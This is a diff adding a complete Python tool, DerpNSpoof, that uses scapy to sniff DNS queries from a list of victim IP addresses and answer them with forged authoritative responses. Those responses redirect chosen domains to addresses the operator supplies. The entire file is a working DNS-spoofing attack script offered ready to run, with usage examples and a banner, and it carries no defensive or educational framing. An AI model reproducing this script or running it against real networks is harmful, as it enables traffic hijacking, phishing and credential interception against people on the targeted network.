@@ -1,0 +1,156 @@
+#!/usr/bin/python3
+# -*- coding: utf-8 -*-
+# Coded by: @adrianfa5
+
+import os
+import sys
+import socket
+import subprocess
+import logging
+from scapy.all import *
+
+# Dictionary with console color codes to print text
+colors = {
+    'HEADER': "\033[95m",
+    'OKBLUE': "\033[94m",
+    'RED': "\033[91m",
+    'OKYELLOW': "\033[93m",
+    'GREEN': "\033[92m",
+    'LIGHTBLUE': "\033[96m",
+    'WARNING': "\033[93m",
+    'FAIL': "\033[91m",
+    'ENDC': "\033[0m",
+    'BOLD': "\033[1m",
+    'UNDERLINE': "\033[4m"
+}
+
+def print_menu():
+    """Display the script menu and usage instructions."""
+    print(colors['WARNING'] + " ____                  _____  _____                 ___ " + colors['ENDC'])
+    print(colors['WARNING'] + "|    \  ___  ___  ___ |   | ||   __| ___  ___  ___ |  _|" + colors['ENDC'])
+    print(colors['WARNING'] + "|  |  || -_||  _|| . || | | ||__   || . || . || . ||  _| " + colors['ENDC'])
+    print(colors['WARNING'] + "|____/ |___||_|  |  _||_|___||_____||  _||___||___||_| " + colors['ENDC'])
+    print(colors['WARNING'] + "                 |_|                |_|                 " + colors['ENDC'])
+    print(colors['GREEN'] + "     Coded by Adrián Fernández Arnal-(@adrianfa5)" + colors['ENDC'])
+    print()
+    print("     --------------------------------------")
+    print(colors['LIGHTBLUE'] + "    [!] Options to use:" + colors['ENDC'])
+    print(colors['LIGHTBLUE'] + "        <ip_file>  - File with IP addresses to spoof" + colors['ENDC'])
+    print(colors['LIGHTBLUE'] + "        <records_file> - File with domain-to-IP mappings" + colors['ENDC'])
+    print(colors['LIGHTBLUE'] + "    [!] Examples:" + colors['ENDC'])
+    print(colors['LIGHTBLUE'] + "        # python3 DerpNSpoof.py ips.txt myfile.txt" + colors['ENDC'])
+    print("     --------------------------------------")
+
+def valid_ip(address):
+    """Check if the provided address is a valid IP address."""
+    try:
+        socket.inet_aton(address)
+        return True
+    except socket.error:
+        return False
+
+def get_local_ip():
+    """Retrieve the local IP address from the system or prompt the user."""
+    try:
+        local_ip = subprocess.check_output(
+            "ip route | grep 'src' | awk '{print $9}'", shell=True
+        ).decode().strip()
+    except subprocess.CalledProcessError:
+        local_ip = input(colors['WARNING'] + "    [!] Cannot get your local IP address, please write it: " + colors['ENDC']).strip()
+    
+    while not valid_ip(local_ip):
+        local_ip = input(colors['WARNING'] + "    [!] Invalid IP address. Please write it again: " + colors['ENDC']).strip()
+    
+    return local_ip
+
+def validate_arguments():
+    """Validate command-line arguments and check victim IPs."""
+    if len(sys.argv) != 3:
+        print('    [i] Usage: <ip_file> <records_file>')
+        sys.exit(1)
+    
+    ip_file = sys.argv[1]
+    records_file = sys.argv[2]
+    
+    if not os.path.isfile(ip_file):
+        print(colors['FAIL'] + "    [!] IP file does not exist" + colors['ENDC'])
+        sys.exit(1)
+    
+    if not os.path.isfile(records_file):
+        print(colors['FAIL'] + "    [!] Records file does not exist" + colors['ENDC'])
+        sys.exit(1)
+    
+    return ip_file, records_file
+
+def read_ip_file(path):
+    """Read and validate IP addresses from the specified file."""
+    ip_list = []
+    with open(path, "r") as file:
+        for line in file:
+            line = line.strip()
+            if line and valid_ip(line):
+                ip_list.append(line)
+            elif line:
+                print(colors['WARNING'] + "    [!] Detected an invalid IP address in the file [" + line + "]" + colors['ENDC'])
+                sys.exit(1)
+    
+    return ip_list
+
+def read_records_file(path):
+    """Read and validate records from the specified file."""
+    if not os.path.isfile(path) or os.stat(path).st_size == 0:
+        print(colors['FAIL'] + "    [!] The file doesn't exist or is empty" + colors['ENDC'])
+        sys.exit(1)
+    
+    registers = {}
+    with open(path, "r") as file:
+        for line in file:
+            line = line.strip()
+            if line:
+                try:
+                    key, value = line.split()
+                    if not valid_ip(value):
+                        print(colors['WARNING'] + "    [!] Detected an invalid IP address in the file [" + value + "]" + colors['ENDC'])
+                        sys.exit(1)
+                    registers[key] = value
+                except ValueError:
+                    print(colors['FAIL'] + "    [!] Invalid file format: <domain> <fake_address>" + colors['ENDC'])
+                    sys.exit(1)
+    
+    return registers
+
+def create_fake_dns_response(pkt, registers):
+    """Generate a fake DNS response based on the captured packet and records."""
+    if UDP in pkt and DNS in pkt:
+        if pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0:
+            domain = str(pkt[DNSQR].qname)[2:-2]
+            if domain in registers:
+                fake_response = IP(dst=pkt[IP].src, src=pkt[IP].dst) / UDP(dport=pkt[UDP].sport, sport=53) / DNS(
+                    id=pkt[DNS].id,
+                    qd=pkt[DNS].qd,
+                    aa=1,
+                    qr=1,
+                    ancount=1,
+                    an=DNSRR(rrname=pkt[DNSQR].qname, rdata=registers[domain])
+                )
+                send(fake_response, verbose=0)
+                print(colors['GREEN'] + "    [#] Spoofed response sent to " + colors['ENDC'] + "[" + pkt[IP].src + "]" + colors['WARNING'] + ": Redirecting " + colors['ENDC'] + "[" + domain + "]" + colors['WARNING'] + " to " + colors['ENDC'] + "[" + registers[domain] + "]")
+
+def sniff_packets(ip_list, registers):
+    """Sniff packets and process DNS queries."""
+    def check_victims(pkt):
+        return IP in pkt and pkt[IP].src in ip_list
+    
+    sniff(prn=lambda pkt: create_fake_dns_response(pkt, registers) if check_victims(pkt) else None, filter='udp dst port 53', store=0)
+
+def main():
+    """Main function to execute the script."""
+    print_menu()
+    ip_file, records_file = validate_arguments()
+    ip_list = read_ip_file(ip_file)
+    registers = read_records_file(records_file)
+    print('    [i] Spoofing DNS responses...')
+    sniff_packets(ip_list, registers)
+
+if __name__ == "__main__":
+    main()
